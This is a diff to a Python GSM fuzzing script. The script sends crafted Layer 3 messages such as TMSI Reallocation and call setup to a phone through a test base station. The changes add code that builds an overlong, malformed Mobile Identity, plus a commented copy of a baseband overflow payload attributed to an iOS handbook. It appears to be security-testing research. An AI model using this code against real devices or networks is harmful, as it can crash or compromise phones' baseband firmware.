@@ -54,7 +54,7 @@ def fuzzingLengthFields(field, function, length):
 	# 11 cmServiceRequest
 	# 12 identityResponse
 	# 13 ptmsiReallocationCommand
-
+	p = '\x05\x18\x01';
 	if(field == 1):
 		if(function == 1):
 			p = gsm_um.imsiDetachIndication();
@@ -65,11 +65,19 @@ def fuzzingLengthFields(field, function, length):
 			return p
 		elif(function == 3):
 			p = gsm_um.tmsiReallocationCommand();
+			p = fakeMobileID(p);
+			p = correctLocalAreaID(p)
 			return p
 		# For testing, works fine
 		elif(function == 4):
 			p = gsm_um.identityRequestMM();
 			return p
+		elif(function == 5):
+			p = gsm_um.setupMobileOriginated();
+			return p
+		elif(function == 6):
+			p = gsm_um.connectAcknowledge();
+			return p;
 	######## 2 NetworkName() ########
 	#elif(field == 2):
 		# 1 mmInformation
@@ -96,19 +104,62 @@ def fuzzingLengthFields(field, function, length):
 	
 	return p
 
+def mobileFillID(packet, start, length):
+	# 00666666
+	# 04666666
+	for i in range (start,length):
+		if((i + 2) % 4 == 0):
+			exec "packet.idDigit%s_1=3" % (i)
+			exec "packet.idDigit%s=3" % (i)
+		else:
+			exec "packet.idDigit%s_1=7" % (i)
+			exec "packet.idDigit%s=7" % (i)
 
-def MobileIDLength(packet, length):
-	packet.oddEven=1; packet.typeOfId=4; 
-	for i in range (2,length):
-		exec "packet.idDigit%s_1=2" % (i)
-		exec "packet.idDigit%s=2" % (i)
 	return packet
+
+def correctMobileID(p):
+	#5220670380
+	p.lengthMI=8;
+	p.idDigit1=2;
+	p.oddEven=1; p.typeOfId=1; 
+	p.idDigit2_1=4; p.idDigit2=0; 
+	p.idDigit3_1=4; p.idDigit3=0;
+	p.idDigit4_1=2; p.idDigit4=5; 
+	p.idDigit5_1=0; p.idDigit5=2;
+	p.idDigit6_1=7; p.idDigit6=6;
+	p.idDigit7_1=3; p.idDigit7=0;
+	p.idDigit8_1=0; p.idDigit8=8;
+	#p.idDigit9_1=2; p.idDigit9=2;
+	return p
+
+def fakeMobileID(p):
+	p.lengthMI=8; 
+	p.idDigit1=2;
+
+	p.oddEven=1; p.typeOfId=2; 
+
+	# digits start with length of packet p
+	p = mobileFillID(p, 2, 67);
+
+	return p
+
+def correctLocalAreaID(a):
+	a.mccDigit1=0x1; 
+	a.mccDigit2=0x0; 
+	a.mccDigit3=0x0; 
+
+	a.mncDigit1=0x0;
+	a.mncDigit2=0x1; 
+	a.mncDigit3=0x0;
+
+	a.lac1=0x03; a.lac2=0xe9;
+	return a
 
 # Adb connection with the mobile device
 adb = adbConnection();
 
 # Fuzzing loop
-for x in range (0,5):
+for x in range (0,1):
 
 	# Fuzzing counter
 	print "Fuzzing: ", x;
@@ -116,7 +167,9 @@ for x in range (0,5):
 	# Fields: {MobileID = 1, NetworkName = 2, ChannelDescription = 3, UserUser = 4}
 	# Function list above at fuzzingLengthFields()
 	# Length is variable, determined by x
-	packet = fuzzingLengthFields(1, 4, x);
+	packet = fuzzingLengthFields(1, 5, x);
+	if(x == 1):
+		packet = fuzzingLengthFields(1, 6, x);
 
 	# Make the packet readable
 	printable = str(packet).encode("hex");
@@ -127,7 +180,8 @@ for x in range (0,5):
 	l3msg = printable.decode('hex');
 	l3msg_input = repr(L3Mobile.parse_L3(l3msg));
 
-	# Creating a socket
+	print l3msg_input;
+	#Creating a socket
 	tcsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	tcsock.settimeout(6)
 	try:
@@ -180,7 +234,38 @@ for x in range (0,5):
 # hexstr += "%02x%02x%02xfc" % (lai>>8, lai&255, (4*len+1))
 # hexstr += ''.join('%02x666666' % (4*i) for i in range(len))
 # r = binascii.unhexlify(hexstr)
-# gsm_um.hexdump(r);
+
+# printable2 = str(r).encode("hex");
+# print printable2;
+# print 42>>8;
+ 
+ # Compare
+ #051a010010
+ #03e90229
+ #4040250276300800
+
+# Original overflow IOS handbook
+# 051a00f110
+# 002a4dfc
+# 00666666
+# 04666666
+# 08666666
+# 0c666666
+# 10666666
+# 14666666
+# 18666666
+# 1c666666
+# 20666666
+# 24666666
+# 28666666
+# 2c666666
+# 30666666
+# 34666666
+# 38666666
+# 3c666666
+# 40666666
+# 44666666
+# 48666666
 
 #hexstr = "06198e480100000000000000000000400000f800002b"
 
